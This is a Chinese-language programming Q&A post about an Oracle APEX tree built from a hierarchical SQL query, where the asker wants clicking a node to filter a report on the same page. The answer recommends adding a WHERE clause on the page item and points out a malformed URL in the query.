[http://apex.oracle.com/pls/apex/f?p=36648:34:1599336964673301::NO](http://apex.oracle.com/pls/apex/f?p=36648:34:1599336964673301::NO) :::

我试过这个查询来组成我的树：

```
select case when connect_by_isleaf = 1 then 0
            when level = 1             then 1
            else                           -1
       end as status, 
       level, 
       "NAME" as title, 
       null as icon, 
       "ID" as value, 
       null as tooltip, 
       decode(level, 1, 'f?p=&APP_ID.:106:'||:APP_SESSION||'::::P106_MAQ_ID:'||ID, 
                     2, 'f?p=&APP_ID.:106:'||:APP_SESSION||'::::::::P106_MAQ_ID:'||(ID-1000), 
                     3, 'f?p=&APP_ID.:104:'||:APP_SESSION||'::::P106_MAQ_ID:'||(ID-10000), 
                     4, 'f?p=&APP_ID.:105:'||:APP_SESSION||'::::P106_MAQ_ID:'||(ID-100000)
             ) as link 
from "#OWNER#"."V_TREE1"
start with "PID" is null
connect by prior "ID" = "PID"
order siblings by "NAME" 
```

但是传递的参数不会改变报告中传递了 ID 的一行。我需要获得上面发布的网站上显示的相同结果。

我在重定向到另一个页面的操作上获得了成功，该页面是一个表单，可以通过报告进行编辑，但不能显示。我想在同一页面上显示。

以下是我用来重定向的查询：

```
select case when connect_by_isleaf = 1 then 0
            when level = 1             then 1
            else                           -1
       end as status, 
       level, 
       "NAME" as title, 
       null as icon, 
       "ID" as value, 
       null as tooltip, 
       decode(level, 1, 'f?p=&APP_ID.:102:'||:APP_SESSION||'::::P102_MAQ_ID:'||ID, 
                     2, 'f?p=&APP_ID.:103:'||:APP_SESSION||'::::P103_SRV_ID:'||(ID-1000), 
                     3, 'f?p=&APP_ID.:104:'||:APP_SESSION||'::::P104_INS_ID:'||(ID-10000), 
                     4, 'f?p=&APP_ID.:105:'||:APP_SESSION||'::::P105_SIS_ID:'||(ID-100000)
             ) as link 
from "#OWNER#"."V_TREE1"
start with "PID" is null
connect by prior "ID" = "PID"
order siblings by "NAME" 
```

非常感谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-24T07:52:11.390

*   你的树页面是什么？第 106 页？
*   你那里有东西吗？
*   该页面有报告吗？
*   该报告使用的查询是什么？

很可能您没有更改您的报告查询。假设您的树/报告页面为 106，并且您希望将结果过滤为`P106_MAQ_ID`. 您需要将其包含在您的 where 子句中：

```
SELECT ...
FROM ...
WHERE MAQ_ID = :P106_MAQ_ID; 
```

您发布的查询中也存在错误。您的第 2 级解码包含太多冒号，无法提供有效的顶点 url (`2, 'f?p=&APP_ID.:106:'||:APP_SESSION||'::::::::P106_MAQ_ID:'||(ID-1000),)`